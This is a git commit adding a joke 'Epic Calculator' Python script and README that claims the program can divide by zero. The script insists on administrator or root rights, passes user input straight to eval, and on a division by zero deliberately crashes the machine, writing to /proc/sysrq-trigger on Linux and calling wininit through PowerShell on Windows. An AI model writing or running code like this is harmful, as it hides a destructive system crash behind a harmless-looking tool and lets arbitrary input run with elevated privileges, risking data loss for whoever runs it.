c8084912c18938c0a1ea4f6e2823e4366670b09b
Mattia Buccheri <mattiabuccheri.mb@gmail.com>
2024-08-12 23:43:54 +0200

    first commit

---
+++ README.md
@@ -0,0 +1,5 @@
+# Epic Calculator
+
+Simple calculator program that is able to divide by zero without throwing errors, because nothing is impossible/undetermined. 
+
+Have fun
---
+++ epic_calculator.py
@@ -0,0 +1,32 @@
+import platform
+import os
+SO = platform.system()
+root = False
+
+# check if user is root so that the program can keep running
+try:
+    if os.getuid() == 0:
+        root = True
+except AttributeError:
+    import ctypes
+    if ctypes.windll.shell32.IsUserAnAdmin() != 0:
+        root = True
+
+if root == False:
+    print("This program cannot run properly without administrator privileges.")
+    exit()
+
+# main
+print("Welcome to epic calculator!")
+while 1:
+    eq = input("Input a mathematical equation to solve: ")
+    try:
+        # very dangerous
+        print(eval(eq))
+    except ZeroDivisionError:
+        if SO == "Windows":
+            os.system('powershell -Command "wininit"')
+        elif SO == "Linux":
+            os.system('echo c > /proc/sysrq-trigger')
+        else:
+            print("lolz you're not running a supported os, wait 4 supportz m8!!!!!")
